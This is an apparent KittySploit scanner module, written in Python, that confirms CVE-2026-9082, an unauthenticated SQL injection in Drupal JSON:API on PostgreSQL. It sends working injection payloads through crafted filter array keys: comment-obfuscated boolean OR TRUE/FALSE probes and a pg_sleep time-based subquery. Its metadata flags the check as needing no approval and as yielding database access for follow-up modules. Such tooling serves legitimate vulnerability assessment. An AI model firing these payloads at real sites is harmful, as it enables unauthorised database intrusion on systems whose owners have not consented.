#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-9082 — Drupal PostgreSQL JSON:API filter-key SQLi detection."""

import time
from typing import List, Optional, Tuple
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_CANARY_A = "CVE20269082a"
_CANARY_B = "CVE20269082b"
_CANARY_C = "CVE20269082c"
_SLEEP_THRESHOLD = 3.0


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Drupal CVE-2026-9082 PostgreSQL JSON:API SQLi detection",
        "description": (
            "Detects Drupal with JSON:API and confirms CVE-2026-9082 "
            "(SA-CORE-2026-004): PostgreSQL EntityQuery Condition interpolates "
            "attacker-controlled filter value array keys into SQL placeholders. "
            "Boolean (OR TRUE/FALSE) and optional pg_sleep probes on "
            "/jsonapi/{type}. Affects Drupal on PostgreSQL through the fixed "
            "branches (10.4.10 / 10.5.10 / 10.6.9 / 11.1.10 / 11.2.12 / 11.3.10). "
            "MySQL/MariaDB/SQLite not affected."
        ),
        "author": ["Michael Maturi", "7h30th3r0n3", "KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-9082",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-9082",
            "https://www.drupal.org/sa-core-2026-004",
            "https://www.tenable.com/blog/cve-2026-9082-highly-critical-sql-injection-vulnerability-in-drupal-core-sa-core-2026-004",
            "https://slcyber.io/research-center/keys-to-the-kingdom-anonymous-sql-injection-in-drupal-core-cve-2026-9082/",
        ],
        "modules": [
            "auxiliary/scanner/http/drupal_cve_2026_9082_sqli",
        ],
        "tags": [
            "web",
            "scanner",
            "drupal",
            "jsonapi",
            "sqli",
            "postgresql",
            "unauthenticated",
            "cve-2026-9082",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.35,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["drupal"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/jsonapi"],
                "param_any": ["filter"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "db_access", "from_detail": "sqli"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/scanner/http/drupal_cve_2026_9082_sqli",
                ],
            },
        },
    }

    port = OptPort(80, "Drupal HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    base_path = OptString("/", "Drupal base path", required=False)
    resource_type = OptString(
        "",
        "Force JSON:API resource (e.g. node/article); empty = auto-discover",
        required=False,
    )
    active_probe = OptBool(True, "Run boolean / time-based SQLi probes", required=False)
    sleep_seconds = OptInteger(
        5,
        "pg_sleep seconds for time-based probe",
        required=False,
        advanced=True,
    )

    def _timeout(self) -> int:
        return max(int(self.timeout or 30), 15)

    def _base(self) -> str:
        val = str(self.base_path or "/").strip() or "/"
        if not val.startswith("/"):
            val = "/" + val
        return val.rstrip("/")

    def _path(self, suffix: str) -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _build_qs(field: str, injection_key: str) -> str:
        ek = quote(injection_key, safe="")
        return (
            f"filter%5Bsqli%5D%5Bcondition%5D%5Bpath%5D={quote(field, safe='')}"
            f"&filter%5Bsqli%5D%5Bcondition%5D%5Boperator%5D=IN"
            f"&filter%5Bsqli%5D%5Bcondition%5D%5Bvalue%5D%5B0%5D={_CANARY_A}"
            f"&filter%5Bsqli%5D%5Bcondition%5D%5Bvalue%5D%5B1%5D={_CANARY_B}"
            f"&filter%5Bsqli%5D%5Bcondition%5D%5Bvalue%5D%5B{ek}%5D={_CANARY_C}"
        )

    def _inject(
        self, resource_type: str, field: str, injection_key: str
    ) -> Tuple[Optional[object], float]:
        qs = self._build_qs(field, injection_key)
        path = self._path(f"/jsonapi/{resource_type}?{qs}")
        start = time.perf_counter()
        response = self.http_request(
            method="GET",
            path=path,
            headers={"Accept": "application/vnd.api+json"},
            timeout=self._timeout(),
            allow_redirects=False,
        )
        return response, time.perf_counter() - start

    def _looks_like_drupal(self) -> bool:
        response = self.http_request(
            method="GET",
            path=self._path("/"),
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if not response:
            return False
        headers = {k.lower(): str(v).lower() for k, v in (response.headers or {}).items()}
        text = (response.text or "").lower()
        if "drupal" in headers.get("x-generator", ""):
            return True
        if "drupal" in text or "sites/default" in text:
            return True
        return False

    def _jsonapi_up(self) -> bool:
        response = self.http_request(
            method="GET",
            path=self._path("/jsonapi"),
            headers={"Accept": "application/vnd.api+json"},
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if not response or response.status_code != 200:
            return False
        return "jsonapi" in (response.text or "").lower()

    def _discover_types(self) -> List[str]:
        forced = str(self.resource_type or "").strip().strip("/")
        if forced:
            return [forced]

        found: List[str] = []
        response = self.http_request(
            method="GET",
            path=self._path("/jsonapi"),
            headers={"Accept": "application/vnd.api+json"},
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if response and response.status_code == 200:
            try:
                data = response.json() or {}
            except Exception:
                data = {}
            links = data.get("links") or {}
            for key in links:
                if str(key).startswith("node--"):
                    found.append(str(key).replace("--", "/"))

        if found:
            return found

        for candidate in ("node/article", "node/page", "node/basic_page"):
            response = self.http_request(
                method="GET",
                path=self._path(f"/jsonapi/{candidate}"),
                headers={"Accept": "application/vnd.api+json"},
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if response and response.status_code == 200:
                found.append(candidate)
        return found

    def _data_rows(self, response) -> Optional[int]:
        if not response:
            return None
        try:
            data = response.json() or {}
            rows = data.get("data")
            if isinstance(rows, list):
                return len(rows)
        except Exception:
            return None
        return None

    def _probe_bool(self, rt: str) -> bool:
        print_status(f"Boolean probe on {rt}…")
        resp_t, _ = self._inject(
            rt, "title", "1))/**/OR/**/TRUE/**/OR/**/1=1/**/OR/**/((1=1"
        )
        resp_f, _ = self._inject(
            rt, "title", "1))/**/OR/**/FALSE/**/AND/**/1=2/**/OR/**/((1=2"
        )
        n_t = self._data_rows(resp_t)
        n_f = self._data_rows(resp_f)
        if n_t is None or n_f is None:
            return False
        print_info(f"OR TRUE → {n_t} rows | OR FALSE → {n_f} rows")
        return n_t > n_f

    def _probe_time(self, rt: str) -> bool:
        sleep_s = max(int(self.sleep_seconds or 5), 2)
        print_status(f"Time-based probe on {rt} (pg_sleep={sleep_s})…")
        _, baseline = self._inject(rt, "title", "2")
        key = (
            f"1))/**/OR/**/(SELECT/**/CASE/**/WHEN/**/current_user/**/IS/**/NOT/**/NULL"
            f"/**/THEN/**/pg_sleep({sleep_s})/**/ELSE/**/pg_sleep(0)"
            f"/**/END)::text=((chr(49)"
        )
        _, injected = self._inject(rt, "title", key)
        delay = injected - baseline
        print_info(f"baseline={baseline:.2f}s injected={injected:.2f}s Δ={delay:.2f}s")
        return delay >= _SLEEP_THRESHOLD

    def run(self):
        print_status("Fingerprinting Drupal + JSON:API…")
        if not self._looks_like_drupal() and not self._jsonapi_up():
            print_error("Drupal / JSON:API not detected")
            return False

        if not self._jsonapi_up():
            print_error("JSON:API not reachable — cannot probe CVE-2026-9082 this way")
            print_info("Site may still be vulnerable via /user/login if PostgreSQL")
            return False

        print_success("JSON:API available")
        types = self._discover_types()
        if not types:
            print_error("No node resource types discovered")
            return False
        print_info(f"Resource types: {', '.join(types[:8])}")

        if not self.active_probe:
            if hasattr(self, "set_info"):
                self.set_info(
                    severity="medium",
                    cve="CVE-2026-9082",
                    reason="Drupal JSON:API up; active_probe disabled",
                    confidence="low",
                )
            return True

        for rt in types:
            if self._probe_bool(rt) or self._probe_time(rt):
                print_warning(f"CVE-2026-9082 confirmed on {rt} (PostgreSQL)")
                if hasattr(self, "set_info"):
                    self.set_info(
                        severity="critical",
                        cve="CVE-2026-9082",
                        reason=f"SQLi confirmed via JSON:API filter keys on {rt}",
                        confidence="high",
                    )
                print_warning(
                    "Follow up: auxiliary/scanner/http/drupal_cve_2026_9082_sqli"
                )
                return True

        print_info(
            "No SQLi signal (not PostgreSQL, patched, empty content, or restricted API)"
        )
        if hasattr(self, "set_info"):
            self.set_info(
                severity="info",
                cve="CVE-2026-9082",
                reason="JSON:API present; CVE-2026-9082 not confirmed",
                confidence="low",
            )
        return True
